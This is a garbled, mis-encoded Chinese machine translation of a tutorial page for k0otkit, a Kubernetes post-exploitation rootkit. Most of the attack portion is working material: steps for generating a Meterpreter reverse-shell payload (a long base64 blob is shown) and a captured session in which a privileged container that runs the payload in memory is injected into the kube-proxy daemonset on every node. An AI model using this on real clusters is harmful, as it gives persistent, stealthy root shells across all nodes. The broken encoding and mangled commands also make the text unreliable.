# K0Otkit:é€šç”¨åç©¿é€æŠ€æœ¯ï¼Œå¯ç”¨äºç©¿é€ Kubernetes é›†ç¾¤

> åŸæ–‡ï¼š<https://kalilinuxtutorials.com/k0otkit/>

[![](img//6c78c6da8a7f7816bcfcedf225f096af.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9HXZGh18bSTKjhzQaVf_EOufQ0FISGu92TdQ37wX0MBwGeSFvnxz8P_0pOfRN8m9ATIzP0v4HbypoXrdkYCs4LDi7_QFjSlUu5gcSPTXw0iFQYht4nzB_Hr3xh5-uW3OPpnwxPEc7guXUp9jIvHPmg600OzOA0VxSw9e_B4rfCcD1HbNfMScAitVB/s728/k0otkit%20(1).png)

k0otkit æ˜¯ä¸€ç§é€šç”¨çš„åæ¸—é€æŠ€æœ¯ï¼Œå¯ç”¨äºæ¸—é€ Kubernetes ç°‡ã€‚

ä½¿ç”¨ k0otkitï¼Œæ‚¨å¯ä»¥å¿«é€Ÿã€éšè”½å’Œè¿ç»­åœ°æ“ä½œç›®æ ‡ Kubernetes é›†ç¾¤ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹(åå‘ shell)ã€‚

k0otkit æ˜¯ **Kubernetes** å’Œ **rootkit** çš„ç»„åˆã€‚

å…ˆå†³æ¡ä»¶:

**k0otkit æ˜¯ä¸€ä¸ªåç©¿é€å·¥å…·ï¼Œæ‰€ä»¥ä½ è¦å…ˆå¾æœä¸€ä¸ªé›†ç¾¤ï¼Œæƒ³åŠæ³•é€ƒå‡ºå®¹å™¨ï¼Œè·å¾—ä¸»èŠ‚ç‚¹çš„ root æƒé™(ç¡®åˆ‡çš„è¯´ï¼Œä½ è¦è·å¾—ç›®æ ‡ Kubernetes çš„ admin æƒé™)ã€‚**

åœºæ™¯:

*   åœ¨ç½‘ç»œæ¸—é€ä¹‹åï¼Œä½ å¾—åˆ°ä¸€ä¸ªç›®æ ‡çš„å¤–å£³ã€‚
*   å¦‚æœ‰å¿…è¦ï¼Œæ‚¨å¯ä»¥è®¾æ³•æå‡æƒé™å¹¶å®ç°å®ƒã€‚
*   æ‚¨å‘ç°ç›®æ ‡ç¯å¢ƒæ˜¯ Kubernetes é›†ç¾¤ä¸­çš„ä¸€ä¸ªå®¹å™¨(Pod)ã€‚
*   ä½ è®¾æ³•ä»é›†è£…ç®±ä¸­é€ƒè„±å¹¶æˆåŠŸé€ƒè„±(ä½¿ç”¨ CVE-2016-5195ã€CVE-2019-5736ã€docker.sock æˆ–å…¶ä»–æŠ€æœ¯)ã€‚
*   æ‚¨è·å¾—äº†ä¸»èŠ‚ç‚¹çš„æ ¹ shellï¼Œå¹¶ä¸”èƒ½å¤Ÿå°†ä¸»èŠ‚ç‚¹ä¸Šå¸¦æœ‰`**kubectl**`çš„é›†ç¾¤æŒ‡ç¤ºä¸º`**admin**`ã€‚
*   ç°åœ¨ï¼Œæ‚¨å¸Œæœ›å°½å¿«æ§åˆ¶é›†ç¾¤ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚k0otkit æ¥äº†ï¼

k0otkit è¯¦è§ *k0otkit:ç”¨ K8s çš„æ–¹å¼é»‘ K8s*ã€‚

## ç”¨æ³•

ç¡®ä¿åœ¨ç›®æ ‡ Kubernetes çš„ä¸»èŠ‚ç‚¹ä¸Šæœ‰æ ¹ shellã€‚(å¦‚æœæ‚¨æ‹¥æœ‰ç›®æ ‡ Kubernetes çš„ç®¡ç†å‘˜æƒé™ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ k0otkitï¼Œå°½ç®¡æ‚¨å¯èƒ½éœ€è¦ä¿®æ”¹`**k0otkit_template.sh**`ä¸­çš„ **`kubectl`** å‘½ä»¤æ¥ä½¿ç”¨ä»¤ç‰Œæˆ–è¯ä¹¦ã€‚)

ç¡®ä¿æ‚¨å·²ç»åœ¨æ”»å‡»è€…ä¸»æœºä¸Šå®‰è£…äº† Metasploit(`**msfvenom**`å’Œ`**msfconsole**`åº”è¯¥å¯ç”¨)ã€‚

**éƒ¨ç½² k0otkit**

å…‹éš†æ­¤å­˜å‚¨åº“:

**git å…‹éš† https://github.com/brant-ruan/k0otkit
CD k0otkit/
chmod+x ./*ã€‚sh**

ç”¨æ‚¨è‡ªå·±çš„ IP å’Œç«¯å£æ›¿æ¢`**pre_exp.sh**`ä¸­æ”»å‡»è€…çš„ IP å’Œç«¯å£:

**æ”»å‡»è€… _IP=192.168.1.107
æ”»å‡»è€… _ ç«¯å£=4444**

**ç”Ÿæˆ k0otkit**

**ã€‚/pre_exp.sh**

`**k0otkit.sh**`å°†è¢«ç”Ÿæˆã€‚ç„¶åè¿è¡Œåå‘ shell å¤„ç†ç¨‹åº:

**ã€‚/handle _ multi _ reverse _ shell . sh**

ä¸€æ—¦å¤„ç†ç¨‹åºå‡†å¤‡å¥½ï¼Œå¤åˆ¶`**k0otkit.sh**`çš„å†…å®¹å¹¶ç²˜è´´åˆ°ç›®æ ‡ Kubernetes çš„ä¸»èŠ‚ç‚¹ä¸Šçš„ shell ä¸­ï¼Œç„¶åæŒ‰`**<Enter>**`æ‰§è¡Œå®ƒã€‚

ç¨ç­‰ç‰‡åˆ»ï¼Œäº«å—æ¥è‡ªæ‰€æœ‰èŠ‚ç‚¹çš„åå‘å¤–å£³ğŸ™‚

é™„æ³¨:ä½¿ç”¨ k0otkit æ“ä½œ Kubernetes é›†ç¾¤çš„æ•°é‡æ²¡æœ‰é™åˆ¶ã€‚

**ä¸ç‚®å¼¹äº’åŠ¨**

æˆåŠŸéƒ¨ç½² k0otkit åï¼Œæ‚¨å¯ä»¥éšæ„ä¸ä»»ä½•åå‘ shell è¿›è¡Œäº¤äº’:

## ç‰¹å¾

*   åˆ©ç”¨ K8s çš„èµ„æºå’ŒåŠŸèƒ½(ä»¥ K8s çš„æ–¹å¼é»‘ K8s)
*   åŠ¨æ€å®¹å™¨æ³¨å…¥
*   é€šä¿¡åŠ å¯†(æ„Ÿè°¢ Meterpreter)
*   æ— ç”Ÿå‘½çš„

## ä¸¾ä¾‹

ç”Ÿæˆ k0otkit:

kali@kali:~/k0otkit$ã€‚/pre_exp.sh

*   **æ”»å‡»è€… _IP=192.168.1.107**
*   **æ”»å‡»è€… _ ç«¯å£=4444**
*   **TEMP_MRT=mrt**
*   **MSF venom-p Linux/x86/meter preter/reverse _ TCP LPORT = 4444 LHOST = 192 . 168 . 1 . 107-f elf-o mrt
    ++ xxd-p mrt
    ++ tr-d ' \ n '
    ++ base64-w 0**
*   **PAYLOAD=N2Y0NTRjNDYwMTAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMjAwMDMwMDAxMDAwMDAwNTQ4MDA0MDgzNDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAzNDAwMjAwMDAxMDAwMDAwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDA4MDA0MDgwMDgwMDQwOGNmMDAwMDAwNGEwMTAwMDAwNzAwMDAwMDAwMTAwMDAwNmEwYTVlMzFkYmY3ZTM1MzQzNTM2YTAyYjA2Njg5ZTFjZDgwOTc1YjY4YzBhODEzZjM2ODAyMDAxMTVjODllMTZhNjY1ODUwNTE1Nzg5ZTE0M2NkODA4NWMwNzkxOTRlNzQzZDY4YTIwMDAwMDA1ODZhMDA2YTA1ODllMzMxYzljZDgwODVjMDc5YmRlYjI3YjIwN2I5MDAxMDAwMDA4OWUzYzFlYjBjYzFlMzBjYjA3ZGNkODA4NWMwNzgxMDViODllMTk5YjI2YWIwMDNjZDgwODVjMDc4MDJmZmUxYjgwMTAwMDAwMGJiMDEwMDAwMDBjZDgw**
*   **sed s/PAYLOAD_VALUE_BASE64/N2Y0NTRjNDYwMTAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMjAwMDMwMDAxMDAwMDAwNTQ4MDA0MDgzNDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAzNDAwMjAwMDAxMDAwMDAwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDA4MDA0MDgwMDgwMDQwOGNmMDAwMDAwNGEwMTAwMDAwNzAwMDAwMDAwMTAwMDAwNmEwYTVlMzFkYmY3ZTM1MzQzNTM2YTAyYjA2Njg5ZTFjZDgwOTc1YjY4YzBhODEzZjM2ODAyMDAxMTVjODllMTZhNjY1ODUwNTE1Nzg5ZTE0M2NkODA4NWMwNzkxOTRlNzQzZDY4YTIwMDAwMDA1ODZhMDA2YTA1ODllMzMxYzljZDgwODVjMDc5YmRlYjI3YjIwN2I5MDAxMDAwMDA4OWUzYzFlYjBjYzFlMzBjYjA3ZGNkODA4NWMwNzgxMDViODllMTk5YjI2YWIwMDNjZDgwODVjMDc4MDJmZmUxYjgwMTAwMDAwMGJiMDEwMDAwMDBjZDgw/g k0otkit_template.sh**

è¿è¡Œåå‘å¤–å£³å¤„ç†ç¨‹åº:

**kali@kali:~/k0otkit$ã€‚/handle _ multi _ reverse _ shell . sh
payload =>Linux/x86/meter preter/reverse _ TCP
LHOST =>0 . 0 . 0 . 0
LPORT =>4444
exit onsession =>false
[*]æ¼æ´åˆ©ç”¨ä½œä¸ºåå°ä½œä¸š 0 è¿è¡Œã€‚[*]æ”»å‡»å·²å®Œæˆï¼Œä½†æœªåˆ›å»ºä¼šè¯ã€‚**

å°†`**k0otkit.sh**`çš„å†…å®¹å¤åˆ¶åˆ°ç›®æ ‡ Kubernetes çš„ä¸»èŠ‚ç‚¹ä¸Šçš„ shell ä¸­ï¼Œç„¶åæŒ‰`**<Enter>**`:

**kali@kali:~$ nc -lvnp 10000
listening on [any] 10000 â€¦
connect to [192.168.1.107] from (UNKNOWN) [192.168.1.106] 48750
root@victim-2:~# volume_name=cache
mount_path=/var/kube-proxy-cache
ctr_name=kube-proxy-cache
binary_file=/usr/local/bin/kube-proxy-cache
payload_name=cache
secret_name=proxy-cache
secret_data_name=content
ctr_line_num=$(kubectl â€“kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml | awk â€˜/ containers:/{print NR}â€™)
volume_line_num=$(kubectl â€“kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml | awk â€˜/ volumes:/{print NR}â€™)
image=$(kubectl â€“kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml | grep â€ image:â€ | awk â€˜{print $2}â€™)
create payload secret
cat << EOF | kubectl â€“kubeconfig /root/.kube/config apply -f â€“ apiVersion: v1 kind: Secret metadata: name: $secret_name namespace:volume_name=cache root@victim-2:~# root@victim-2:~# mount_path=/var/kube-p kube-system type: Opaque data: $secret_data_name: N2Y0NTRjNDYwMTAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMjAwMDMwMDAxMDAwMDAwNTQ4MDA0MDgzNDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAzNDAwMjAwMDAxMDAwMDAwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDA4MDA0MDgwMDgwMDQwOGNmMDAwMDAwNGEwMTAwMDAwNzAwMDAwMDAwMTAwMDAwNmEwYTVlMzFkYmY3ZTM1MzQzNTM2YTAyYjA2Njg5ZTFjZDgwOTc1YjY4YzBhODEzZjM2ODAyMDAxMTVjODllMTZhNjY1ODUwNTE1Nzg5ZTE0M2NkODA4NWMwNzkxOTRlNzQzZDY4YTIwMDAwMDA1ODZhMDA2YTA1ODllMzMxYzljZDgwODVjMDc5YmRlYjI3YjIwN2I5MDAxMDAwMDA4OWUzYzFlYjBjYzFlMzBjYjA3ZGNkODA4NWMwNzgxMDViODllMTk5YjI2YWIwMDNjZDgwODVjMDc4MDJmZmUxYjgwMTAwMDAwMGJiMDEwMDAwMDBjZDgw EOF assume that ctr_line_num < volume_line_num otherwise you should switch the two sed commands below inject malicious container into kube-proxy pod kubecroxy-cache root@victim-2:~# root@victim-2:~# ctr_name=kube-proxy-cache root@victim-2:~# root@victim-2:~# binary_file=/usr/local/bin/kube-proxy-cache root@victim-2:~# root@victim-2:~# payload_name=cache root@victim-2:~# root@victim-2:~# secret_name=proxy-cache root@victim-2:~# root@victim-2:~# secret_data_name=content root@victim-2:~# root@victim-2:~# ctr_line_num=$(kubectl â€“kubeconfig /root/.kube/config -n kube-system get daemonsets kube-tl â€“kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml \ sed â€œ$volume_line_num a\ \ \ \ \ \ â€“ name: $volume_name\n hostPath:\n path: /\n type: Directory\nâ€ \ sed â€œ$ctr_line_num a\ \ \ \ \ \ â€“ name: $ctr_name\n image: $image\n imagePullPolicy: IfNotPresent\n command: [\â€sh\â€]\n args: [\â€-c\â€, \â€echo \$$payload_name | perl -e â€˜my \$n=qq(); my \$fd=syscall(319, \$n, 1); open(\$FH, qq(>&=).\$fd); select((select(\$FH), \$|=1)[0]); print \$FH pack q/H*/, ; my \$pid = fork(); if (0 != \$pid) { wait }; if (0 == \$pid){system(qq(/proc/\$\$\$\$/fd/\$fd))}â€™\â€]\n env:\n â€“ name: $payload_name\n valueFrom:\n secretKeyRef:\n pr name: $secret_name\n key: $secret_data_name\n securityContext:\n privileged: true\n volumeMounts:\n â€“ mountPath: $mount_path\n name: $volume_nameâ€ \ containers:/{print NR}â€™)oxy -o yaml | awk â€˜/ root@victim-2:~# root@victim-2:~# volume_line_num=$(kubectl â€“kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml | awk â€˜/ volumes:/{print NR}â€™) root@victim-2:~# root@victim-2:~# image=$(kubectl â€“kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml | grep â€ image:â€ | awk â€˜{print $2}â€™) root@victim-2:~# root@victim-2:~# # create payload secret root@victim-2:~# cat << EOF | kubectl â€“kubeconfig /root/.kube/config apply -f â€“ apiVersion: v1 kind: Secret metadata: name: $secret_name namespace: kube-system type: Opaque data: $secret_data_name: N2Y0NTRjNDYwMTAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMjAwMDMwMDAxMDAwMDAwNTQ4MDA0MDgzNDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAzNDAwMjAwMDAxMDAwMDAwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDA4MDA0MDgwMDgwMDQwOGNmMDAwMDAwNGEwMTAwMDAwNzAwMDAwMDAwMTAwMDAwNmEwYTVlMzFkYmY3ZTM1MzQzNTM2YTAyYjA2Njg5ZTFjZDgwOTc1YjY4YzBhODEzZjM2ODAyMDAxMTVjODllMTZhNjY1ODUwNTE1Nzg5ZTE0M2NkODA4NWMwNzkxOTRlNzQzZDY4YTIwMDAwMDA1ODZhMDA2YTA1ODllMzMxYzljZDgwODVjMDc5YmRlYjI3YjIwN2I5MDAxMDAwMDA4OWUzYzFlYjBjYzFlMzBjYjA3ZGNkODA4NWMwNzgxMDViODllMTk5YjI2YWIwMDNjZDgwODVjMDc4MDJmZmUxYjgwMTAwMDAwMGJiMDEwMDAwMDBjZDgw EOF secret/proxy-cache created root@victim-2:~# root@victim-2:~# # assume that ctr_line_num < volume_line_num root@victim-2:~# # otherwise you should switch the two sed commands below root@victim-2:~# root@victim-2:~# # inject malicious container into kube-proxy pod root@victim-2:~# kubectl â€“kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml \ sed â€œ$volume_line_num a\ \ \ \ \ \ â€“ name: $volume_name\n hostPath:\n path: /\n type: Directory\nâ€ \ sed â€œ$ctr_line_num a\ \ \ \ \ \ â€“ name: $ctr_name\n image: $image\n imagePullPolicy: IfNotPresent\n command: [\â€sh\â€]\n args: [\â€-c\â€, \â€echo \$$payload_name | perl -e â€˜my \$n=qq(); my \$fd=syscall(319, \$n, 1); open(\$FH, qq(>&=).\$fd); select((select(\$FH), \$|=1)[0]); print \$FH pack q/H*/, ; my \$pid = fork(); if (0 != \$pid) { wait }; if (0 == \$pid){system(qq(/proc/\$\$\$\$/fd/\$fd))}â€™\â€]\n env:\n â€“ name: $payload_name\n valueFrom:\n secretKeyRef:\n name: $secret_name\n key: $secret_data_name\n securityContext:\n privileged: true\n volumeMounts:\n â€“ mountPath: $mount_path\n name: $volume_nameâ€ \
kubectl replace -f â€“
daemonset.extensions/kube-proxy replaced**

[**Download**](https://github.com/Metarget/k0otkit)